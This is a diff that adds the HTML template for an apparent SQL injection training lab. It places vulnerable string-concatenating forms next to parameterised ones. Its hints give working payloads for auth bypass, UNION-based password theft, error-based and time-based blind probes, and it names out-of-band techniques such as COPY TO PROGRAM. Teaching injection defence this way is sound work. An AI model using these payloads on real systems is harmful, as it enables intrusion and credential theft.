@@ -1,0 +1,93 @@
+{% extends "base.html" %}
+{% block title %}SQL Injection Demo{% endblock %}
+{% block content %}
+<section class="intro">
+  <h1>SQL Injection playground</h1>
+  <p>
+    This app stores <strong>username</strong>, <strong>email</strong>, and <strong>password</strong>
+    in PostgreSQL and queries them with raw SQL. The left column concatenates input into SQL
+    (vulnerable). The right column uses parameterised queries (secure).
+  </p>
+  <p class="warning">
+    Goal: extract passwords via injection. Start with the vulnerable Search form and a UNION payload.
+  </p>
+</section>
+
+<div class="grid-2">
+  <section class="panel danger">
+    <h2>Vulnerable (string concatenation)</h2>
+
+    <h3>1. Login</h3>
+    <p class="hint">Auth bypass: <code>admin'--</code> with any password, or <code>' OR '1'='1'--</code></p>
+    <form method="post" action="/vulnerable/login">
+      <label>Username <input name="username" placeholder="admin" required></label>
+      <label>Password <input name="password" placeholder="anything" required></label>
+      <button type="submit">Login (vulnerable)</button>
+    </form>
+
+    <h3>2. Search user (in-band / UNION / error-based)</h3>
+    <p class="hint">
+      Steal passwords:
+      <code>' UNION SELECT username, password FROM users--</code>
+    </p>
+    <p class="hint">
+      Error-based probe:
+      <code>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</code>
+    </p>
+    <form method="post" action="/vulnerable/search">
+      <label>Username <input name="username" placeholder="vnguyen" required></label>
+      <button type="submit">Search (vulnerable)</button>
+    </form>
+
+    <h3>3. Existence check (boolean / time-based blind)</h3>
+    <p class="hint">Boolean: compare response text (found vs not found).</p>
+    <p class="hint">
+      Time-based:
+      <code>admin' AND pg_sleep(5)--</code>
+    </p>
+    <form method="get" action="/vulnerable/check">
+      <label>Username <input name="username" placeholder="admin" required></label>
+      <button type="submit">Check (vulnerable)</button>
+    </form>
+  </section>
+
+  <section class="panel safe">
+    <h2>Secure (parameterised queries)</h2>
+
+    <h3>1. Login</h3>
+    <p class="hint">Try the same payloads — they are treated as literal strings.</p>
+    <form method="post" action="/secure/login">
+      <label>Username <input name="username" placeholder="admin" required></label>
+      <label>Password <input name="password" placeholder="Adm1nS3cret!" required></label>
+      <button type="submit">Login (secure)</button>
+    </form>
+
+    <h3>2. Search user</h3>
+    <form method="post" action="/secure/search">
+      <label>Username <input name="username" placeholder="vnguyen" required></label>
+      <button type="submit">Search (secure)</button>
+    </form>
+
+    <h3>3. Existence check</h3>
+    <form method="get" action="/secure/check">
+      <label>Username <input name="username" placeholder="admin" required></label>
+      <button type="submit">Check (secure)</button>
+    </form>
+  </section>
+</div>
+
+<section class="panel info">
+  <h2>Out-of-band (OOB) notes</h2>
+  <p>
+    OOB attacks force the database to contact an attacker-controlled host (DNS/HTTP).
+    A listener is running at <code>http://localhost:9999</code> (container: <code>listener</code>).
+  </p>
+  <p>
+    In PostgreSQL, true OOB usually needs privileged features such as
+    <code>COPY … TO PROGRAM</code>, <code>dblink</code>, or foreign data wrappers — often disabled.
+    See <code>docs/01-SQL-Injection-Types.md</code> and <code>docs/03-Exploitation-Walkthrough.md</code>
+    for payloads and a safe lab exercise against the listener.
+  </p>
+  <p class="hint">Sample users: admin, vnguyen, atran, ble, lsmith, ojones</p>
+</section>
+{% endblock %}
